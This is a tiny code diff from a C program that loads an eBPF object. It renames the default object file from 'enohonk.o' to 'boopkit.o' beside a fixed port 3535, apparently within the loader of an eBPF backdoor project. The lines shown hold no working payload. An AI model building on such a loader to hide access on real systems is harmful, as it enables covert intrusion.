@@ -12,7 +12,7 @@
 #define PORT 3535
 
 int main(int argc, char **argv) {
-    char path[PATH_MAX] = "enohonk.o";
+    char path[PATH_MAX] = "boopkit.o";
     int loaded;
     struct bpf_object *obj;
     printf("-----------------------------------------------\n");
